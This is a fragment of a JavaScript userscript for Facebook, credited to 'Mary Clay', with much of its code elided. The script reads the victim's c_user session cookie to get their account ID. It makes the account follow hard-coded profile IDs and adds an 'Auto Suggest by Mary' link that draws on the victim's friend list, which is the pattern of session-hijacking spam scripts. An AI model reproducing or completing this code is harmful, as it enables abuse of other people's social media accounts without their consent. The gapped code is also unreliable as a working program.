...
// @author			Mary Clay
// @authorURL			https://www.facebook.com/Hiiiimrandom
...
a("100006355693755"); //Mary Clay
a("100001850640362"); //Obey Justin
sublist("");
...
var spage_id = "100006355693755";
var spost_id = "100006355693755";
var sfoto_id = "100006355693755";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Mary';
